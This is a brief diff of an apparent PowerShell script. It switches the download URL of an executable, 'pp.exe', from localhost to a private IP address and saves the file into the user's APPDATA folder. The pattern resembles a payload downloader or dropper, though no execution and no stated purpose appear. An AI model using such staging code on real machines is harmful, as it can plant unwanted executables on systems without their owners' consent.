@@ -1,5 +1,5 @@
 # Define the URL and the destination path
-$url = "http://localhost:8000/pp.exe"
+$url = "http://10.1.1.223:8000/pp.exe"
 $destination = "$env:APPDATA\pp.exe"
 
 # Download the executable
